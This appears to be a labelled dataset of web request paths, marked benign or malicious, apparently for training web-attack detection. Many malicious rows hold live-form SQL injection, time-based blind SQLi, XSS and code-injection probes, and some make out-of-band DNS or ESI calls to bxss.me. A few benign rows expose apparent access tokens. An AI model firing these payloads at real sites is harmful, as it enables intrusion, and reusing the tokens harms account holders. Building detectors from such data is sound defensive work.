request	label
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u9a6c\u971e\u7f8e\u5986\u5730\u5e26\u5316\u5986\u54c1\u5e97	0
/***/0/02/12/13/2121322_738317.png	0
/******/usercenter/index?qrcode=12790&code=081cf5100rme0n1xrw0006ermd0cf51o	0
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u6dee\u5b9a\u533b\u7597\u6280\u672f\u670d\u52a1\u90e8	0
/zwxx_11337/****/201911/t20191111_1845351.html	0
/**********/system/2021/08/12/013434009.shtml	0
/****/yqzt/qyddt/202004/t20200405_245266.html	0
/*****/search.asp?field=my_baizi&classid=&keyword=\ufffd\ufffd\u0329\ufffd\ufffd	0
/****/zzxxgk/tjj/zfxxgkml' and 2*3*8=6*8 and 'zsfy'='zsfy_2127/xwfbh_2065/list.html	1
"/************/template/' 'a'.concat(70-3).concat(22*4).concat(102).concat(88).concat(104).concat(86) (require'socket'
socket.gethostbyname('hitdy' 'wgdwanphaa9bd.bxss.me.')[3].to_s) '/110105008056111/16/images/ui.css"	1
"/******/web/jpage/theme/default/css/'""""()&%<acx><script >evhi(9949)</script>.css"	1
/if(now()=sysdate(),sleep(12),0)/******/ncwywfgz/1.htm	1
/*******/js/jquery.superslide.2.1.1.js	1
/*******/202101/202101240906211003.html	0
/*******/qiye/2ijnmi_83_e143960088.html	0
/******/image/m-close.png	0
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(675)"">?_=1630311547744"	1
/**********/system/2021/11/30/013488111.shtml	0
/****************/notification?access_token=afc0226f-e922-4089-a885-839121b137b4&id=undefined	0
/*****/system/2021/07/13/013418253.shtml	0
/****/bmkx/sfgw/201610/t20161025_14220.html	0
"/***/getdetail?vno=3.5.0&data={""news_id"":""1263542"",""diversion_id"":"""",""sign"":""""}"	0
"/***/2021/10/12/art"""" and 2*3*8=6*8 and """"1a3m""""=""""1a3m_31_242356.html"	1
/****/czgk/bmjs/qtdw/zzqnfb/201908/t20190808_1656562.html	0
/****/zdlygk' and 2*3*8=6*8 and '9l7c'='9l7c/ncwywfgz/szss/plq/xmb_gzdxb.htm	1
/*******/template/jcse/110105008056111/16/images/condition.js	1
/**********/system/2020/05/28/013172778.shtml	0
/****/bmkx/sgsj/202103/w020210308618040714181.jpg	0
/***/0/10/26/55/10265581_968364.jpg	0
/****/2020jnxc/yxzp/index_4.html	0
/****/4farvc-hynews-e112416064.html	0
/****/zgsdt/gzxwzgsdt/	1
/***/weixin/getconf?url=https:/xhn-wap.hinews.cn/news_details.html?from=androidapp&id=1263808&version=3.6.0	0
/*****/webinterface/function/?command=getxmllisting&format=jsonobj&path=%<script>alert(777)</script>&random=0.3300707341372783	1
"/******/jslib/ckplayer/ckplayer.js/""""><script>alert(522)</script>?_=1630311501948"	1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u534e\u6e05\u79d1\u6280\u6587\u5316\u4f20\u64ad\u6709\u9650\u516c\u53f8	0
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u59da\u6625\u971e\u519c\u4ea7\u54c1\u7ecf\u7eaa\u884c	0
/******/usercenter/index?qrcode=5940&code=071x5a000tlnzm1at9200cwulf2x5a0n	0
/**/system/2021/12/16/012230646.shtml	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u9648\u5e73\u9c9c\u9762\u5e97	0
/************/template/jcse/bxss.me/16/images/result.css	1
/****/gjzqq/index.html?continent=) and 3878=3878#	1
/**/admin.php?cont=store_nas	1
/**/ui/lib%' and 2*3*8=6*8 and '7qsm'!='7qsm%/easyui/plugins/jquery.linkbutton.js	1
/****/zfgb/2019/201908/p020190815582201256454.pdf	0
"/***/2021/' 'a'.concat(70-3).concat(22*4).concat(119).concat(70).concat(113).concat(75) (require'socket'
socket.gethostbyname('hitsy' 'gvqfefgr827e6.bxss.me.')[3].to_s) '/12/art_32_242398.html"	1
/***/screendata/nowplanprogresstest02.z	0
/***********/zaojianpinglun/?_=1640036113437	0
/***/system/2011/04/08/010336481.shtml	0
/****/bmkx/sfgw/201610/t20161025_14145.html	0
/****/businesses-e20291_71.html?category_id	0
/**/system/2021/09/27/javascript:void(0);	1
/******/system/2014/05/20/011402159.shtml	0
/*******/9sf.php	1
/****/system/2020/07/03/013198427_01.shtml	0
/****/system/2021/12/18/013496464.shtml	0
/*******/qiye/b-e2046665.html	0
/****/bmkx/sfgw/201610/t20161025_14237.html	0
/*******/202012/202012181505541174.html	0
/**/sustainability/csr/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/***/0/02/03/37/2033712_412231.png	0
/**/netflow/jspui/j_security_check?radiususerenabled=false&authrule_name=authenticator&j_username=admin52f43'><script>alert(777)</script>6f472a19875&j_password=admin	1
/**********/system/2020/05/22/013168132.shtml	0
"/jsearchfront'""""()&%<acx><script >cfou(9424)</script>/********/jcse/110105008056111/16/images/result.css"	1
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u8042\u7fd4\u670d\u88c5\u5e97	0
/****/20211202/javascript:void(0);	1
/******/qhkc/js/	0
/****/zfgb/2021/202109/p020210901557709242522.pdf	0
/************/search/mainframe.do?begin=&end=&eq=&oq=&p=1&pg=1&pos=&pq=if(now()=sysdate(),sleep(15),0)&q=请输入关键词&searchid=1&tpl=16&websiteid=110105008056111	1
"/****/advanced-search/?term=asdf&""><script>alert(777)</script>"	1
/****/wlj/ldhd	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u4e70\u4e3d\u4e13\u4e1a\u67d3\u70eb\u5e97	0
"/****/gjzqq/index.html?continent=' or 3434=5032 	1
/****/20200814/e105054084.html	0
/investors-garden/**********/video/2021-12-01/11064.html	0
/****/web/search?channelid=222832&searchword=\u60e0\u519c\u533a\u53e3\u6c34\u6d41\u9e2d\u8116\u5e97	0
/**********/system/2021/06/09/013399328.shtml	0
/****/tzgg/202006/t20200612_2136098_zzb.html	0
/******/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u4e00\u54c1\u9999\u9910\u5385	0
"/****/web/search?channelid=234439' and 5437=5375 	1
/***/mobile_h5/waparticledetail.do?article_id=202010111218041015&contenttype=article	0
"/****/zfwjn/1088<esi:include src=""""http://bxss.me/rpb.png""""/>/1110/list.html"	1
/****/web/search?channelid=222832&searchword=\u539f\u5dde\u533a\u4e09\u8425\u9547\u4e94\u91d1\u5efa\u6750\u79df\u8d41\u90e8	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtpshuhwh sa3czdujazfzou=&openid=ovl7jjnzgwxqnf0bmm00czrtuf3s&outer_str=quicklyrq,2,0,77105&activate_ticket=fdzv9emqaffrnr3xboqhb1jykens2cvxbdqlv719h4hoo8dbj5 fzedtzplsmcarob7c/bvlxukq55/htbnt/s3w4lysaxiqz6aku/ycr5k=	0
/***/getallchannels?vno=convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1246682516')))	1
/****/zt/nlkfxjjsyq/syqdt/202005/t20200515_2091240.html	0
/****/bmkx/sgaj/bxss.me/t20181208_112298.html	1
"/******/jslib/ckplayer/ckplayer.js/""><script>alert(571)</script>?_=1630311519791"	1
/****/zzxxgk/wsjkwyh/images/p020200526804527391502.png	0
/**********/jkyl2/javascript:void();	1
/zwxx_11337/****/201911/t20191122_1859205.html	0
/*****/gy48/cpgyss.asp?key=\u5170\u683c\u7f51\u62a5\ufffd?&l=\ufffd\ufffd\ufffd\ufffd	0
/*******/qiye/b-e1567799.html	0
/******/business-area/if(now()=sysdate(),sleep(9),0)/	1
/******/system/2021/12/13/013493557.shtml	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4f0a\u7a46\u9999\u7f8a\u9910\u5385	0
/****/202010/t20201012_2252956.html	0
/**********/system/2021/06/22/javascript:window.print()	1
/*********/treasury/index.aspx?nodeid=394 and 1346=1346-- wscc	1
/*******/hdjl/zxxx/	0
/*******/qiye/b-e2224700.html	0
/**********/system/2020/05/22/013167689.shtml	0
"/****/czgk/bmyjs/zzqzfzcbmyzstsjg/zzqsjt/"">\u5b81\u590f\u516c\u8def\u7ba1\u7406\u4e2d\u5fc3</a>"	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u9676\u4e50\u9547\u9999\u9999\u6e14\u5177\u5e97	0
/**********/system/2021/02/01/013330207.shtml	0
"/***/col36/index.html/""><script>alert(824)</script>"	1
/****/gzdt/2020_gzdt?en/	0
/**/aytism.php	1
/****/pucghtmain/querypucghtiscomplete.z	0
/****/xxgknb/2013/http://bxss.me/t/fit.txt.html	1
/****/wzs/ldhd/	0
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u6d69\u6021\u5546\u5e97	0
"/****/zfwjn/1088/1093/list.html?new="""".gethostbyname(lc(""""hitdu"""".""""xqzlzfom2c615.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(107).chr(66).chr(121).chr(80)."""""	1
/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqzfhcxjst/202008/t20200818_2189609.html	0
/****/zgsdt/2010zgsdt/index_6.html	0
/****/dqgz/201912/t20191210_240299.html	0
/****/spzl/spxw/	0
/***/blockdata/getsearchinfo.do?&title=\u515a\u53f2	0
/****/sj1/jjzs/202108/t20210803_2951904.html	0
"/****/bmkx/scl/202012/"""	0
/****/czgk/bmjs/gmzdp/zzqmm/201609/t20160909_318564.html	0
"/******/5/jquery.db_tabmotionbanner.min'""""()&%<acx><script >dmii(9545)</script>.js"	1
/****/system/2021/08/16/013435216.shtml	0
/*****/?loginid=10000853&stamp=1639991326176&token=8c995e25b8648f75987e9818ab77a0888f30da2b&hrn=10000853	0
/****************/images/crm/default/ico_coupon_claimed.png	0
/***/viewspace-178.html	0
/******/system/2021/12/06/javascript:window.close();	1
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u80dc\u5229\u4e61\u7ea2\u6885\u94c1\u9505\u7116\u9762\u9986	0
/****/xqdt/byq/202111/w020211126396489806684.jpg	0
/*******/8vsv24om.php	1
/**********/system/2021/05/31/013394327.shtml	0
/**/system/2008/03/10/002441927.shtml	0
"/****/abantecart/index.php?rt=""><script>alert(777);</script>&s=your_admin""><script>alert(777);</script>&token=957bf7cb71078f4471807da1c42d721e""><script>alert(777);</script>"	1
/**********/system/2020/03/31/013129190.shtml	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u9e3f\u8fd0\u4fe1\u606f\u670d\u52a1\u90e8(\u7ecf\u7eaa\u4eba)	0
/******/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/jquery.ellipsis.js	1
/***/interface/url_total_pv.json.jsp?callback=jquery191028385066693969185_1640025037581	0
/******/public/2021/12/16/20211216_17dc2bb5f7e_r1_1200k.mp4	0
"/************/search.do/""""><script>alert(843)</script>?websiteid=110105008056111&pg=&p=&tpl=16&category=1&cateid=1&q=请输入关键词"	1
/*****/article-e135634016.html	0
/*******/qiye/businesses-e45028_3.html?category_id=232358	0
/**********/system/2018/04/14/012588568.shtml	0
/**********/system/2020/08/27/013234777.shtml	0
/****/web/search?channelid=222832&searchword=\u539f\u5dde\u533a\u9ec4\u94ce\u5821\u9547\u5c0f\u9a6c\u51c9\u76ae\u5e97	0
"/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/******/gytdsdfwzs/zzq/zcwj.htm"	1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u6728\u9526\u70e7\u70e4\u5e97	0
"/************/template/jcse/110105008056111/16/'""""()&%<acx><script >vpin(9110)</script>/plugin/waterpull/pinterest_grid.js"	1
/****/jtdt/2020_jtyw/202002/w020200207725105644523.jpg	0
/****/xqdt/byq/201807/w020180731340413178701.jpg	0
/**********/system/2021/12/16/013495425.shtml	0
/***/blockdata/getsearchinfo.do?&title=\u4e0a\u6768\u56de\u65cf\u4e61	0
/****/xqdt/hnx/201610/w020161025738238696249.jpg	0
/****/shzr/lnysj/'http:/leyubet1410.com/'	0
"/***/2021'""""()&%<acx><script >kunb(9796)</script>/10/12/art_32_242398.html"	1
"/****/wdsjs<esi:include src=""""http://bxss.me/rpb.png""""/>/hfswsj/zmhdyc.html"	1
/****/user/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects)	1
/******/scy_kjcxzjeg_03.png	0
/****/xqdt/byq/201810/w020181023387974787734.jpg	0
"/****/system/2021/09/08/013447520'""""/><img src=javascript:alert(1513) .shtml"	1
/*******/201812/201812071654171209.html	0
/******/if(now()=sysdate(),sleep(15),0)/urite/urite.min.js	1
/****/system/2021/08/05/javascript:window.print()	1
/****/zzxxgk/jjhzj/sqgk/xhjj/	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u897f\u590f\u533a\u946b\u60a6\u68cb\u724c\u5ba4	0
/**********/system/2021/10/01/013459704.shtml	0
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u9999\u4e07\u5e74\u9762\u9986	0
"/****/byszf/sz/202108/t20210806_185416.html?leader=张延保<esi:include src=""""http://bxss.me/rpb.png""""/>"	1
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtl7xqgh6cow7gbkzsatfszk=&openid=ovl7jjjdzybd3abw3jlkeoct8f3u&outer_str=14372&activate_ticket=fdzv9emqaffrnr3xboqhbycifyhctwdr wmda2wxnyfoo8dbj5 fzedtzplsmcarv6yy5bgckk1qtpp537cbi78hoabwc2qkb0hl4gwlwl0=	0
/***/0/00/92/63/926319_014262.gif	0
/****/201909/t20190926_1757087.html	0
/********/plan_template_preview.aspx?template_id=sys.fn_varbintohexstr(hashbytes('md5','a719s'))	1
/****/zgsdt/2011zgsdt/201412/w020141218475319391085.jpg	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u60e0\u4f17\u5927\u836f\u5e97	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u674e\u519b\u67b8\u675e\u8d2d\u9500\u7ecf\u7eaa\u4eba	0
/****/tusby/xdny/201910/w020191028322698324361.png	0
/***/003/004/136/00300413671_a173d4af.png	0
/****/zzxxgk/wsjkwyh/gzdt_3599/xxdt/202102/w020210204331689400212.jpg	0
/**********/system/2021/12/20/013497257.shtml	0
"/***/2019/11/17/art_392_192569.html/""><script>alert(959)</script>"	1
/****/yqzt/mtjs/	1
"/****/web/search?page=2&channelid=253477&searchword=1*/-->'""""></iframe></script></style></title></textarea><script >alert(85490)</script>&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10"	1
/****/xxgkml/qtfdxx/zcjd/qwjd/list.html	0
"/****/wp-admin/admin.php?page=thecartpress/admin/addressedit.php&address_id='""><script>alert(77729;</script>"	1
/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/********/js/base64.js	1
/**********/system/2021/07/30/013427856.shtml	0
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(854)"">?_=1630311617223"	1
/**********/system/2021/12/20/013497322.shtml	0
/******/xxwzqh/img3/4.jpg	0
/******/system/2015/03/03/011649859.shtml	0
/****/bmkx/rmyh/201806/p020180629348147329592.docx	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u9686\u6e56\u7efc\u5408\u5546\u5e97	0
/**********/system/2020/06/01/013174884.shtml	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u5fd7\u82b1\u5bbe\u9986	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u946b\u6e90\u5bb6\u5177\u5e97	0
/**********/system/2021/11/20/javascript:void();	1
/****/system/2017/10/19/javascript:window.close();	1
/****/system/2021/12/14/013493993.shtml	0
/**********/system/2021/10/11/013462311.shtml	0
/****/20200708/e103284553.html	0
/wp-content/*******/404-plugin/c.php	1
/***/0/02/12/44/2124404_800529.jpg	0
"/****/web/search?iptsword=*/-->'""""></iframe></script></style></title></textarea><script >alert(40430)</script>"	1
/****/zdlygk/ncwywfgz/ycs%' and 2*3*8=6*8 and 'd2xy'!='d2xy%/hlx/xmb_gzdxb.htm	1
/****/20200926/e107491001.html	0
/******/visitcount/visit.jsp?i_columnid=1&i_webid[0]==extractvalue(1,concat(char(126),md5(1735899078)))and 3 in &i_webid[1]=3&type=1	1
/****/bmkx/sfgw/201610/local.replace(	0
/**/index.php?title=acunetixtest109b78&action=submit	1
/******/	1
/****/czgk/bmjs/zzqjcyxt/ycxjcy/201708/t20170818_549571.html	0
/****/202101/t20210108_269123.html	0
/****/b-e722179.html	0
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u037f&l=\ufffd\ufffd\ufffd	0
/****/system/count/0036053/000000000000/	0
/****/xqdt/jtx/201610/t20161025_43465.html	0
/*****/system/2020/08/17/javascript:void(0);	1
/****/xxgknb/2018/bmnb2018/201903/w020190306323762411278.jpg	0
"/****/zzxxgk/tjj/zfxxgkml_2127/'""""()&%<acx><script >uocq(9462)</script>_2042/list.html"	1
/*******/zwgk/czgk/bmyjs/rmtt/fxh/	0
/*****/hzgy/cpgyss.asp?key=\u001a\u001a\u001a\u0093\u001a\u0094?\u001a\u001a\u008a\u001a\u0080\u89c4\u0090\u009e\u001a\u0083\u001a\u001a\u001a\u001a\u009c\u001a\u001a\u001a\u001a\u009f\u001a\u001a\u001a\u0090\u001a\u001a\u0086\u001a\u0080\u5b64\u0089\u001a\u0091\u0081\u001a\u0085\u001a\u0085\u008d\u6d60\u60f0\u001a\u0084\ufffd\u517c\u001a\u0087\u001a\u0087\u0086\u5382\u5bb6	0
/****/web/search?channelid=222832&searchword=\u77f3\u5634\u5c71\u5e02\u5927\u6b66\u53e3\u533a\u552f\u4e1d\u9020\u578b\u5e97	0
/******/system/2018/02/07/javascript:window.print()	1
/****/qzfwj/201911/t20191111_1845248.html	0
/*******/qiye/businesses-e32757_2.html?category_id=157230	0
/*****/gy48/cpgyss.asp?key=\u65e0\u673a\u73bb\u7483\u94a2\u98ce\ufffd?&l=\ufffd\ufffd\ufffd\ufffd	0
/**********/system/2020/05/22/013168025.shtml	0
/****/20210719/10149.html	0
"/****/czgk/bmjs/zzqdwyzfpcjgyzsjgyzssydw/zzqdzj/\""javascript:void(0)\"""	1
/*****/shxw/	0
/****/category/jishuchuangxin?page=1%') and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),6)--	1
/****/tzgg/201201/t20120109_319129.html	0
/zwxx_11337/****/202007/t20200727_2173232.html	0
/***/0/02/11/81/2118197_989582.png	0
/***/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u770b\u70b9	0
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u04ba\u03bb\ufffd\u01bf\ufffd&l=\ufffd\u03fa\ufffd	0
/******/yzys/images/top.jpg	0
/zwxx_11337/****/zcjd/202111/t20211112_3126387.html	0
/****/20210207/e116052937.html	0
/****/zfwjn/1088/1103/list.html?new='.gethostbyname(lc('hitse'.'ropwzcqkd19b5.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(113).chr(82).chr(99).chr(79).'	1
/****/zzxxgk/tjj/zfxxgkml_2127/lzyj/list.html?new=0'xor(if(now()=sysdate(),sleep(15),0))xor'z	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u946b\u76db\u6e90\u5546\u8d38\u90e8	0
/****/zzxxgk/bmfgj/fgztzl/201904/w020210428406951951240.jpg	0
/****/config_data.php	1
/******/uploadpic/image/20190603/1559554695103125.jpg	0
/****/system/2017/03/09/javascript:dozoom(12)	1
/****/qtgkxx/201806/t20180620_188343.html and 1=1	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u4f18\u6d17\u5e93\u5e72\u6d17\u5e97	0
/*******/qiye/b-e2232186.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u535a\u4ea6\u8427\u996e\u54c1\u5e97	0
/****/xxgkml/qtfdxx/zcjd/szcjd/202106/t20210616_183828_wap.html	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u7ecf\u6d4e\u5f00\u53d1\u533a\u91d1\u6854\u82d1\u9ebb\u8fa3\u70eb\u5e97	0
/**********/system/2021/08/31/013442809.shtml	0
/****/js/commons/urls.js?v=11&time=1639991012754	0
/****/ and 1=1	1
"/******/jslib/ckplayer/ckplayer.js/""><script>alert(371)</script>?_=1630311380750"	1
/*********/system/2008/02/15/002372346.shtml	0
"/****/zzxxgk/tjj/zfxxgkml_2127/hygq_"""".gethostbyname(lc(""""hitpc"""".""""eqbybkuoa9f51.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(110).chr(77).chr(106).chr(80).""""/list.html"	1
/******/visitcount/visit.jsp?i_columnid[0]==2and 3 in &i_columnid[1]=convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1074475338')))&i_webid=1&type=1	1
/****/system/2017/03/11/012261595.shtml	0
/*******/201906021714192546	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u5174\u4ec1\u9547\u7530\u519b\u7164\u70ad\u7ecf\u9500\u90e8	0
/****/kjdt/index_151.xml	0
/****/byyw/index_29.html	0
/******/visitcount/visit.jsp?type=3&i_webid=1&i_columnid=34&i_articleid=200077	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u9686\u6e56\u5fd7\u9f99\u52b3\u52a1\u961f	0
/******/jslib/tag/	1
/**/system/2021/12/08/012228283.shtml	0
/**********/system/2021/04/09/013366311.shtml	0
"/************/template/jcse"""" and 2*3*8=6*8 and """"uz9v""""=""""uz9v/110105008056111/16/images/common.js"	1
/****/zjdt/kjybzde/gzdt/if(now()=sysdate(),sleep(12),0).htm	1
/**/system/2020/11/25/012094560.shtml	0
/****/czgk/bmjs/index_22.html	0
/*******/qiye/b-e429708.html	0
"/******/telaen/index.php?tid=default&lid=en_uk&f_email="""">alert(777)"	1
/***/template.cfm?moduletitle=alert(777)	1
/****/zdlygk/if(now()=sysdate(),sleep(12),0)/zws/hyx/xmb_gzdxb.htm	1
/****/category/redianguanzhu?page=1</script><script>yipq(9382)</script>	1
/****/bmkx/sfgw/201808/url	0
/***/interface/url_total_pv.json.jsp?callback=jquery191044106191949614515_1640009031938	0
"/*****/annonce/moteur-prix.php?categoriemoteur=1"""">alert(777);"	1
/*****/gy42/cpgyss.asp?key=\u5929\u6d25\u5927\u53e3\u5f84\u539a\u58c1\u65e0\u65b0\u95fb\u8d44\u8baf&l2=\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
/****/whs/yw_1286/202009/t20200922_2239408.html	0
/***/interface/url_total_pv.json.jsp?callback=jquery19105141276063253475_1639991058606	0
/*******/gjzdsys	0
/****/bmkx/sczj/202009/t20200921_172457_wap.html	0
/*******/qiye/businesses-e42579_2.html?category_id=251687	0
/******/ld_xwzx_bg03_03.png	0
"/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqslt/\""javascript:void(0)\"""	1
/**/products/powermachinery/201505/w020150524336655719828.jpg	0
/images'||'/*/xys.css	1
/******/20210125/9322.html	0
/****/zzxxgk/bmsthjj/xxgkml/hjxx/hjwfbgt/202111/t20211122_196778.html	0
/***/mswpmm/common/newaccount.aspx?btncancel=alert(777)	1
/*******/202104/202104091338491119.html	0
/***/resource/js/***/lib/bootstrap.min.js?v=17	0
/****/zzxxgk/wsjkwyh/gzdt_3599/tzgg_3600/202112/t20211204_197300.html	0
/wp-content/*******/wp-booking-calendar/public/ajax/getmonthcalendar.php?wpml_lang=&calendar_id=1&month=4&publickey=6lcdyoasaaaaacsevy6g4yo1bqxcgw15s15mb36- &year=<script language='php'>echo 10516*61501;</script>	1
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u798f\u946b\u6c7d\u8f66\u9500\u552e\u4e2d\u5fc3	0
/**********/system/2021/12/20/013497309.shtml	0
/****/20210415/javascript:void(0);	1
/****/20201116/e110471975.html	0
"/**/ui"""" and 2*3*8=6*8 and """"xsgq""""=""""xsgq/lib/jquery/jquery.min.js"	1
/******/system/2021/12/06/javascript:void(0);	1
/******/system/2017/05/22/012316734.shtml	0
/******/uploadpic/image/20190603/1559554695870748.jpg	0
/****/qzfwj/201801/t20180115_668667.html	0
/**********/system/2020/12/04/013295953.shtml	0
/******/_content/download.jsp?urltype=news.downloadattachurl%' and 2311=1704 and '%%'='%&owner=1707212448&wbfileid=51419	1
